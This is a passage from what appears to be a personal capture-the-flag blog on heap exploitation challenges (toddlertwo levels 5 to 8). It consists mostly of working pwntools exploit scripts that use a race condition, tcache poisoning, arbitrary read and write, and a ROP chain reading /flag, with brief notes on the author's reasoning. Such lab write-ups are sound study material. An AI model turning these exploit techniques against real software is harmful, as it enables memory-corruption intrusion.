class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> output.split() <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;\x7f&#x27;</span> <span class="hljs-keyword">in</span> a)[<span class="hljs-number">8</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>)<br>    r1.sendline(<span class="hljs-string">b&#x27;malloc 0&#x27;</span>)<br>    <span class="hljs-keyword">return</span> pwn.u64(leak)<br><br>perthread_leak = <span class="hljs-number">0</span>   <br>idx = <span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">controlled_allocation</span>(<span class="hljs-params">r1, r2, addr</span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">global</span> perthread_leak<br>    chunk_0_addr = perthread_leak + <span class="hljs-number">0x650</span><br>        <br>    packed = pwn.p64( (chunk_0_addr&gt;&gt;<span class="hljs-number">12</span>)^addr )<br>    r1.clean(),r2.clean()<br>    r1.sendline(<span class="hljs-string">f&#x27;malloc <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>)<br>    r1.sendline(<span class="hljs-string">f&#x27;free <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment">#after pass scanf check -&gt; free it -&gt; then overwrite tcache next pointer</span><br>        <span class="hljs-keyword">if</span> os.fork() == <span class="hljs-number">0</span>:<br>            r1.sendline(<span class="hljs-string">f&#x27;free 0&#x27;</span>.encode())<br>            os.kill(os.getpid(), <span class="hljs-number">9</span>)<br>            <br>        r2.send((<span class="hljs-string">b&#x27;scanf 0 &#x27;</span> + packed + <span class="hljs-string">b&#x27;\n&#x27;</span>)*<span class="hljs-number">2000</span>)<br>        os.wait()<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 0 printf 0&#x27;</span>)<br>        output = <span class="hljs-string">b&#x27;&#x27;</span><br>        r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>        output = r1.recvline()[:-<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> output == packed.split(<span class="hljs-string">b&#x27;\0&#x27;</span>)[<span class="hljs-number">0</span>]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;OUTPUT: &#x27;</span> + output + <span class="hljs-string">b&#x27; PACKED: &#x27;</span>, packed.split(<span class="hljs-string">b&#x27;\0&#x27;</span>))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-comment">#malloc the controlled chunk</span><br>    r1.sendline(<span class="hljs-string">f&#x27;malloc <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>.encode())<br>    idx += <span class="hljs-number">1</span><br>    <br><span class="hljs-comment">#support 8 bytes read</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_read</span>(<span class="hljs-params">r1, r2, addr, unalign=<span class="hljs-literal">False</span></span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">if</span> unalign:<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 10&#x27;</span>)<br>        arbitrary_write(r1, r2, binary_base+<span class="hljs-number">0x5040</span>+<span class="hljs-number">0x8</span>*<span class="hljs-number">10</span>, addr)<br>        r1.sendline(<span class="hljs-string">b&#x27;printf 10&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        controlled_allocation(r1, r2, addr)<br>        r1.sendline(<span class="hljs-string">f&#x27;printf <span class="hljs-subst">&#123;idx-<span class="hljs-number">1</span>&#125;</span>&#x27;</span>.encode())<br>    r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>    output = r1.clean()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;MESSAGE IS: &#x27;</span>, output)<br>    pwn.context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>    <span class="hljs-keyword">return</span> output<br>    <br><span class="hljs-comment">#support digital write</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_write</span>(<span class="hljs-params">r1, r2, addr, value, unalign=<span class="hljs-literal">False</span></span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">if</span> unalign:<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 10&#x27;</span>)<br>        arbitrary_write(r1, r2, binary_base+<span class="hljs-number">0x5040</span>++<span class="hljs-number">0x8</span>*<span class="hljs-number">10</span>, addr)<br>        r1.sendline(<span class="hljs-string">b&#x27;scanf 10 &#x27;</span> + value[<span class="hljs-number">0</span>].to_bytes(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;little&#x27;</span>))<br>        <span class="hljs-keyword">return</span><br>    controlled_allocation(r1, r2, addr)<br>    r1.sendline(<span class="hljs-string">b&#x27;scanf %d &#x27;</span>%(idx-<span class="hljs-number">1</span>) + pwn.flat(value))<br><br><span class="hljs-keyword">try</span>:<br>    p.kill(),r1.close(),r2.close()<br><span class="hljs-keyword">except</span> Exception:<br>    <span class="hljs-keyword">pass</span><br>pwn.context.log_level=<span class="hljs-string">&#x27;info&#x27;</span><br>pwn.context.binary = <span class="hljs-string">&#x27;./toddlertwo_level2.0.elf64&#x27;</span><br>p=pwn.process(<span class="hljs-string">&quot;./toddlertwo_level2.0.elf64&quot;</span>)<br>p.clean()<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;/proc/<span class="hljs-subst">&#123;p.pid&#125;</span>/maps&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-built_in">print</span>(f.read())<br>r1 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>r2 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br><br>perthread_leak = leak_perthread_addr(r1,r2);<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LEAKED: PERTHREAD: &quot;</span>, <span class="hljs-built_in">hex</span>(perthread_leak))<br>main_arena_ptr_address = perthread_leak - <span class="hljs-number">0x8d0</span> + <span class="hljs-number">0x890</span><br>time.sleep(<span class="hljs-number">0.2</span>)<br>main_arena_addr = pwn.u64(arbitrary_read(r1, r2, main_arena_ptr_address)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;MAIN ARENA ADDR: &quot;</span>, <span class="hljs-built_in">hex</span>(main_arena_addr))<br>libc_base = main_arena_addr - <span class="hljs-number">0x1bdba0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;LIBC BASE: &#x27;</span>, <span class="hljs-built_in">hex</span>(libc_base))<br>stored_rip_addr = main_arena_addr - <span class="hljs-number">0x1c1d78</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;STORED RIP ADDR: &#x27;</span>, <span class="hljs-built_in">hex</span>(stored_rip_addr))<br><span class="hljs-comment">#stored_rip = pwn.u64(arbitrary_read(r1, r2, stored_rip_addr, True)[:-1].ljust(8, b&#x27;\0&#x27;))</span><br><span class="hljs-comment">#print(&#x27;STORED RIP: &#x27;, stored_rip)</span><br>binary_base = <span class="hljs-number">0</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;/proc/<span class="hljs-subst">&#123;p.pid&#125;</span>/maps&quot;</span>) <span class="hljs-keyword">as</span> f: <br>    binary_base = <span class="hljs-built_in">int</span>(f.read(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;BINARY BASE: &#x27;</span>, <span class="hljs-built_in">hex</span>(binary_base))<br><span class="hljs-comment">#LET&#x27;S ROLLING</span><br>win_addr = binary_base + <span class="hljs-number">0x1798</span><br>arbitrary_write(r1, r2, stored_rip_addr, [win_addr], <span class="hljs-literal">True</span>)<br>r1.sendline(<span class="hljs-string">b&#x27;quit&#x27;</span>)<br>p.clean()<br><span class="hljs-built_in">print</span>(r1.clean().decode())<br></code></pre></div></td></tr></table></figure><h4 id="level6-7"><a href="#level6-7" class="headerlink" title="level6"></a>level6</h4><p>Storing the secret in the main threadâ€™s heap.</p><p>what the difference with the previous one?</p><h4 id="level7-6"><a href="#level7-6" class="headerlink" title="level7"></a>level7</h4><p>there is no send_flag command and win() function. </p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> pwn<br><span class="hljs-keyword">import</span> os<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_perthread_addr</span>(<span class="hljs-params">r1,r2</span>):</span><br>    <span class="hljs-keyword">if</span> os.fork()==<span class="hljs-number">0</span>:<br>        r1.sendline(<span class="hljs-string">b&quot;malloc 0 scanf 0 AAAAAAAABBBBBBBB free 0 &quot;</span>*<span class="hljs-number">10000</span>)<br>        exit()<br>    r2.sendline(<span class="hljs-string">b&quot;printf 0 &quot;</span>*<span class="hljs-number">10000</span>)<br>    os.wait()<br>    time.sleep(<span class="hljs-number">0.01</span>)<br>    output = r2.clean()<br>    r1.clean()<br>    leak = <span class="hljs-built_in">next</span>(a <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> output.split() <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;\x7f&#x27;</span> <span class="hljs-keyword">in</span> a)[<span class="hljs-number">8</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>)<br>    r1.sendline(<span class="hljs-string">b&#x27;malloc 0&#x27;</span>)<br>    <span class="hljs-keyword">return</span> pwn.u64(leak)<br><br>perthread_leak = <span class="hljs-number">0</span>   <br>idx = <span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">controlled_allocation</span>(<span class="hljs-params">r1, r2, addr</span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">global</span> perthread_leak<br>    chunk_0_addr = perthread_leak + <span class="hljs-number">0x650</span><br>        <br>    packed = pwn.p64( (chunk_0_addr&gt;&gt;<span class="hljs-number">12</span>)^addr )<br>    r1.clean(),r2.clean()<br>    r1.sendline(<span class="hljs-string">f&#x27;malloc <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>)<br>    r1.sendline(<span class="hljs-string">f&#x27;free <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>)<br><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        <span class="hljs-comment">#after pass scanf check -&gt; free it -&gt; then overwrite tcache next pointer</span><br>        <span class="hljs-keyword">if</span> os.fork() == <span class="hljs-number">0</span>:<br>            r1.sendline(<span class="hljs-string">f&#x27;free 0&#x27;</span>.encode())<br>            os.kill(os.getpid(), <span class="hljs-number">9</span>)<br>            <br>        r2.send((<span class="hljs-string">b&#x27;scanf 0 &#x27;</span> + packed + <span class="hljs-string">b&#x27;\n&#x27;</span>)*<span class="hljs-number">2000</span>)<br>        os.wait()<br>        time.sleep(<span class="hljs-number">0.1</span>)<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 0 printf 0&#x27;</span>)<br>        output = <span class="hljs-string">b&#x27;&#x27;</span><br>        r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>        output = r1.recvline()[:-<span class="hljs-number">1</span>]<br>        <span class="hljs-keyword">if</span> output == packed.split(<span class="hljs-string">b&#x27;\0&#x27;</span>)[<span class="hljs-number">0</span>]:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">b&#x27;OUTPUT: &#x27;</span> + output + <span class="hljs-string">b&#x27; PACKED: &#x27;</span>, packed.split(<span class="hljs-string">b&#x27;\0&#x27;</span>))<br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-comment">#malloc the controlled chunk</span><br>    r1.sendline(<span class="hljs-string">f&#x27;malloc <span class="hljs-subst">&#123;idx&#125;</span>&#x27;</span>.encode())<br>    idx += <span class="hljs-number">1</span><br>    <br><span class="hljs-comment">#support 8 bytes read</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_read</span>(<span class="hljs-params">r1, r2, addr, unalign=<span class="hljs-literal">False</span></span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">if</span> unalign:<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 10&#x27;</span>)<br>        arbitrary_write(r1, r2, binary_base+<span class="hljs-number">0x4040</span>+<span class="hljs-number">0x8</span>*<span class="hljs-number">10</span>, addr)<br>        r1.sendline(<span class="hljs-string">b&#x27;printf 10&#x27;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        controlled_allocation(r1, r2, addr)<br>        r1.sendline(<span class="hljs-string">f&#x27;printf <span class="hljs-subst">&#123;idx-<span class="hljs-number">1</span>&#125;</span>&#x27;</span>.encode())<br>    r1.recvuntil(<span class="hljs-string">b&#x27;MESSAGE: &#x27;</span>)<br>    output = r1.clean()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;MESSAGE IS: &#x27;</span>, output)<br>    pwn.context.log_level = <span class="hljs-string">&#x27;info&#x27;</span><br>    <span class="hljs-keyword">return</span> output<br>    <br><span class="hljs-comment">#support digital write</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">arbitrary_write</span>(<span class="hljs-params">r1, r2, addr, value, unalign=<span class="hljs-literal">False</span></span>):</span><br>    <span class="hljs-keyword">global</span> idx<br>    <span class="hljs-keyword">if</span> unalign:<br>        r1.sendline(<span class="hljs-string">b&#x27;malloc 10&#x27;</span>)<br>        arbitrary_write(r1, r2, binary_base+message_offset+<span class="hljs-number">0x8</span>*<span class="hljs-number">10</span>, addr)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(value[<span class="hljs-number">0</span>]) == <span class="hljs-built_in">bytes</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;SCANF(bytes): &#x27;</span>, value[<span class="hljs-number">0</span>])<br>            r1.sendline(<span class="hljs-string">b&#x27;scanf 10 &#x27;</span> + value[<span class="hljs-number">0</span>])<br>        <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> <span class="hljs-built_in">type</span>(value[<span class="hljs-number">0</span>]) == <span class="hljs-built_in">int</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;SCANF(int): &#x27;</span>, value[<span class="hljs-number">0</span>])<br>            r1.sendline(<span class="hljs-string">b&#x27;scanf 10 &#x27;</span> + value[<span class="hljs-number">0</span>].to_bytes(<span class="hljs-number">8</span>, <span class="hljs-string">&#x27;little&#x27;</span>))<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-comment">#end of `if unalign:`</span><br>    controlled_allocation(r1, r2, addr)<br>    r1.sendline(<span class="hljs-string">b&#x27;scanf %d &#x27;</span>%(idx-<span class="hljs-number">1</span>) + pwn.flat(value))<br><br><span class="hljs-keyword">try</span>:<br>    p.kill(),r1.close(),r2.close()<br><span class="hljs-keyword">except</span> Exception:<br>    <span class="hljs-keyword">pass</span><br>pwn.context.log_level=<span class="hljs-string">&#x27;info&#x27;</span><br>pwn.context.binary = <span class="hljs-string">&#x27;./toddlertwo_level2.0.elf64&#x27;</span><br>p=pwn.process(<span class="hljs-string">&quot;./toddlertwo_level7.0.elf64&quot;</span>)<br>p.clean()<br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;/proc/<span class="hljs-subst">&#123;p.pid&#125;</span>/maps&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    <span class="hljs-built_in">print</span>(f.read())<br>r1 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br>r2 =pwn.remote(<span class="hljs-string">&quot;localhost&quot;</span>,<span class="hljs-number">1337</span>)<br><br>message_offset = <span class="hljs-number">0x4040</span><br>perthread_leak = leak_perthread_addr(r1,r2);<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;LEAKED: PERTHREAD: &quot;</span>, <span class="hljs-built_in">hex</span>(perthread_leak))<br>main_arena_ptr_address = perthread_leak - <span class="hljs-number">0x8d0</span> + <span class="hljs-number">0x890</span><br>time.sleep(<span class="hljs-number">0.2</span>)<br>main_arena_addr = pwn.u64(arbitrary_read(r1, r2, main_arena_ptr_address)[:-<span class="hljs-number">1</span>].ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\0&#x27;</span>))<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;MAIN ARENA ADDR: &quot;</span>, <span class="hljs-built_in">hex</span>(main_arena_addr))<br>libc_base = main_arena_addr - <span class="hljs-number">0x1bdba0</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;LIBC BASE: &#x27;</span>, <span class="hljs-built_in">hex</span>(libc_base))<br>stored_rip_addr = main_arena_addr - <span class="hljs-number">0x1c1d78</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;STORED RIP ADDR: &#x27;</span>, <span class="hljs-built_in">hex</span>(stored_rip_addr))<br><span class="hljs-comment">#stored_rip = pwn.u64(arbitrary_read(r1, r2, stored_rip_addr, True)[:-1].ljust(8, b&#x27;\0&#x27;))</span><br><span class="hljs-comment">#print(&#x27;STORED RIP: &#x27;, stored_rip)</span><br>binary_base = <span class="hljs-number">0</span><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">f&quot;/proc/<span class="hljs-subst">&#123;p.pid&#125;</span>/maps&quot;</span>) <span class="hljs-keyword">as</span> f: <br>    binary_base = <span class="hljs-built_in">int</span>(f.read(<span class="hljs-number">12</span>), <span class="hljs-number">16</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;BINARY BASE: &#x27;</span>, <span class="hljs-built_in">hex</span>(binary_base))<br><br><span class="hljs-comment">#ROLLING!!!!!!!!!!!!!!!!!!!</span><br>libc = p.libc<br>libc.address = libc_base<br>rop = pwn.ROP(libc, badchars=<span class="hljs-string">b&quot;\x09\x0a\x0b\x0c\x0d\x0e\x20&quot;</span>)<br>rop.call(<span class="hljs-string">&quot;close&quot;</span>, [<span class="hljs-number">3</span>]) <span class="hljs-comment"># used for correctly execute sendfile.</span><br>rop.call(<span class="hljs-string">&quot;read&quot;</span>, [<span class="hljs-number">0</span>, libc.bss(<span class="hljs-number">0x123</span>), <span class="hljs-number">42</span>])<br>rop.call(<span class="hljs-string">&quot;open&quot;</span>, [libc.bss(<span class="hljs-number">0x123</span>), <span class="hljs-number">0</span>])<br>rop.call(<span class="hljs-string">&quot;sendfile&quot;</span>, [<span class="hljs-number">1</span>, <span class="hljs-number">3</span>, <span class="hljs-number">0</span>, <span class="hljs-number">1024</span>])<br>rop.call(<span class="hljs-string">&quot;exit&quot;</span>, [<span class="hljs-number">42</span>])<br><br>arbitrary_write(r1, r2, stored_rip_addr, [rop.chain()], <span class="hljs-literal">True</span>)<br>r1.sendline(<span class="hljs-string">&quot;quit&quot;</span>)<br>p.send(<span class="hljs-string">&quot;/flag\0&quot;</span>)<br><span class="hljs-built_in">print</span>( <span class="hljs-string">&quot;LEAKED:&quot;</span>, p.readall())<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;EXITED: &quot;</span>, p.poll())<br></code></pre></div></td></tr></table></figure><h4 id="level8-6"><a href="#level8-6" class="headerlink" title="level8"></a>level8</h4><p>emmmm, i canâ€™t figure out the difference.</p><p>ohhhh, it use the pthread_exit(), not the normal return, so the rop attack to the return address is no longer viable.</p><p>i may alter another threadâ€™s return address, such as thread 3 scanf return. It just lies on the top of the challengeâ€™s stack frame, so it is at the constant offset from somewhere in high address space.</p><blockquote><p>address of the return address pointer of thread 3 scanf is stored at where at a constant offset from store_rip_address with <del>-0x801000</del> bytes distance.</p><img src="../../image/pwn-modules/image-20220625102559622.png" alt="image-20220625102559622" style="zoom:80%;" /></blockquote><p>okay, the fscanf doesnâ€™t have <code>push rbp</code> this procedure, so calc the distance between fscanf and stored_rip_address by <code>rbp+8</code> is purely inaccurate. the actual address of its return address should be checked by gdb into stack:</p><img src="../../image/pwn-modules/image-20220625153005802.png" alt="image-20220625153005802" style="zoom:80%;" /><p><del>the pwntools is going crazy</del>, iâ€™m gonna crazy.</p><ol><li>the read syscall with first arg being 0 wonâ€™t simply work as i thouhgt. there is something strange when communicateing with main threadâ€™s stdin/stdout â€“ could child thread be influenced by it?</li><li>or try to calc the address of tcp channel fd(in TLS addressing by fs register)?</li></ol><blockquote><blockquote><p>the <code>mov rax, fs:0x28</code> means referencing the value stored in fsbase+0x28 then copy it to rax. there is no <strong>shifting</strong>. </p></blockquote><p>the second method looks more feasible. here it is(calc from libc_base):</p><img src="../../image/pwn-modules/image-20220625205927958.png" alt="image-20220625205927958" style="zoom:80%;" /><p>okay, itâ€™s stream pointer, i go wrong again.</p><p><del>when i follow the pace of fscanf, i found that it finally use fd=6 to read data in.</del></p></blockquote><p>Fine, I am now absolutely grasping the principles. the <strong>first problem</strong> above is just a misunderstanding of all the file descriptor and file stream and threads. </p><ul><li>in this program, main thread use <code>accept()</code> to receive a socket connect and return a <code>fd</code>. then <code>run_thread()</code> use <code>fdopen()</code> to turn fd into a <em>FILE* stream</em>, and write this FILE pointer into thread local storage(that is fs-based addressing).</li><li>the FILE stream and file descriptor are interchangeable, first is a high level interface, the second is a low level interface. child threads use <code>fscanf</code> and <code>fprintf</code> to read from or write to the stream(that is fds), that means the whole programâ€™s stdin, stdout, and stderr is still viable in chile thread. so <code>read(0, libc.bss(), 0x400)</code> is correct.</li><li>one more thing needed to notice is that before thread 3 returns from fscanf, somewhere on the stack will be overwritten with what bytes I send into. so I additionally calc the right gadget of <code>pop rdi</code> so that the ropchain works.</li></ul><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> pwn<br><span class="hljs-keyword">import</span> os<br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">leak_perthread_addr</span>(<span class="hljs-params">r1,r2</span>):</span><br>    <span class="hljs-keyword">if</span> os.fork()==<span class="hljs-number">0</span>:<br>        r1.sendline(<span class="hljs-string">b&quot;malloc 0 scanf 0 AAAAAAAABBBBBBBB free 0 &quot;</span>*<span class="hljs-number">10000</span>)<br>        exit()<br>    r2.sendline(<span class="hljs-string">b&quot;printf 0 &quot;</span>*<span class="hljs-number">10000</span>)<br>    os.wait()<br>    time.sleep(<span class="hljs-number">0.01</span>)<br>    output = r2.clean()<br>    r1.clean()<br>    leak = <span class="hljs-built_in">next</span>(a <span class="hljs-keyword">for</span> a <span class="hljs-keyword">in</span> output.split() <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;\x7f&#x27;</span> <span class="hljs-keyword">in</span> a)[<span class="hljs-number">8</span>:].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>)<br>    <span class="hljs-comment">#pwn.gdb.attach(p, &#x27;init-pwndbg\n&#x27;)</span><br>    <span class="hljs-comment">#input(&#x27;press enter to continue&#x27;)</span><br>    r1.sendline(<span class="hljs-string">b&#x27;malloc 0&#x27;</span>)<br>    <span class="hljs-keyword">return</span> pwn.u64(leak)<br><br>perthread_leak = <span class="hljs-number">0</span>   <br>idx = <span class="hljs-number">1</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">controlled_allocation</span>(<span class="hljs-params">r1, r2, addr</span>):</span><br>    